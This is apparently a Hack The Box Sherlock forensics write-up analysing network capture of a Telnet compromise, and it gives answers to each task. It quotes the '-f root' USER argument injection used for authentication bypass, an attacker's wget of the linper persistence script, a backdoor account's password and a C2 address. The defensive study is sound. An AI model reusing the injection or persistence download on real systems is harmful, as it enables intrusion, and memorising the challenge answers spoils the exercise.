# Telly HTB

![telly.png](/TellyHTB/screenshots/telly.png)

# Sherlock Scenario
> You are a Junior DFIR Analyst at an MSSP that provides continuous monitoring and DFIR services to SMBs. Your supervisor has tasked you with analyzing network telemetry from a compromised backup server. A DLP solution flagged a possible data exfiltration attempt from this server. According to the IT team, this server wasn't very busy and was sometimes used to store backups.

# Task 1: What CVE is associated with the vulnerability exploited in the Telnet protocol?

First, let's download and unzip the file:
```bash
unzip Telly.zip
```
It looks like we have a ```.pcapng``` file containing some network traffic. Let's open it with Wireshark.
```bash
wireshark monitoringservice_export_202610AM-11AM.pcapng
```
Let's filter for "telnet" and see what we get:

![telnetfilter.png](/TellyHTB/screenshots/telnetfilter.png)

In packet number 52, we can see that the ```USER``` environment variable is set to the value ```-f root```, which seems suspicious. Let's Google this detail. 

![uservariable.png](/TellyHTB/screenshots/uservariable.png)

A Google search leads us to the following:

> CVE-2026-24061 is a critical authentication bypass in GNU InetUtils telnetd. It affects versions 1.9.3 through 2.7 and carries a CVSS 9.8 severity rating.
At a high level, the Telnet daemon passes an attacker controlled USER value into the system login process without properly sanitizing it, which can lead to argument injection and an authentication bypass that results in root access.

Answer: ```CVE-2026-24061```

# Task 2: When was the Telnet vulnerability successfully exploited, granting the attacker remote root access on the target machine?

Right-click packet 25 and select ```Follow > TCP Stream``` to reconstruct the full Telnet session between the attacker and the server.

![firstexploit.png](/TellyHTB/screenshots/firstexploit1.png)

We will click ```Save as``` to save this conversation locally for later use.

Answer: ```2026-01-27 10:39:28```

# Task 3: What is the hostname of the targeted server?

For some clarity, we'll use the following command:

```bash
cat terminal_log.txt | sed 's/root@backup-secondary/\x1b[31m&\x1b[0m/g'
```

![backupsecondary.png](/TellyHTB/screenshots/backupsecondary.png)

Answer: ```backup-secondary```

# Task 4: The attacker created a backdoor account to maintain future access. What username and password were set for that account?

For the next few tasks, we just need to read through the entire conversation to answer them.

![backdooracc.png](/TellyHTB/screenshots/backdooracc.png)

Answer: ```cleanupsvc:YouKnowWhoiam69```

# Task 5: What was the full command the attacker used to download the persistence script?

![wget.png](/TellyHTB/screenshots/wget.png)

Answer: ```wget https://raw.githubusercontent.com/montysecurity/linper/refs/heads/main/linper.sh```

# Task 6: The attacker installed remote access persistence using the persistence script. What is the C2 IP address?

> A Command and Control (C2) IP address is a malicious address used by threat actors to control compromised systems and steal data. These IPs are dynamic, often utilizing proxies or redirectors to evade detection. 

![c2ipaddress.png](/TellyHTB/screenshots/c2ipaddress.png)

Answer: ```91.99.25.54```

# Task 7: The attacker exfiltrated a sensitive database file. At what time was this file exfiltrated?

![db.png](/TellyHTB/screenshots/db.png)

Answer: ```2026-01-27 10:49:54```

# Task 8: Analyze the exfiltrated database. To follow compliance requirements, the breached organization needs to notify its customers. For data validation purposes, find the credit card number for a customer named Quinn Harris.

Let's export the database from Wireshark:

![exportobjects.png](/TellyHTB/screenshots/exportobjects.png)
![savedb.png](/TellyHTB/screenshots/savedb.png)

The exported file is a SQLite database, which we can inspect using ```sqlite3```.
```bash
sqlite3 credit-cards-25-blackfriday.db
```
![quinn.png](/TellyHTB/screenshots/quinn.png)

Answer: ```5312269047781209```

# Conclusion:

The analysis showed that the backup server was compromised through a vulnerability in the Telnet service `(CVE-2026-24061)`. By abusing the ```USER=-f``` root parameter, the attacker was able to bypass authentication and gain root access to the machine.

Once inside, the attacker created a backdoor account to keep access to the system and downloaded a persistence script to maintain remote control through a C2 server at ```91.99.25.54```. After establishing persistence, the attacker proceeded to exfiltrate a database containing sensitive customer information, including credit card data.

Overall, this investigation shows how an outdated and insecure service like Telnet can lead to a full system compromise and data breach if it is not properly secured or replaced with safer alternatives.

![tellypwned.png](/TellyHTB/screenshots/tellypwned.png)


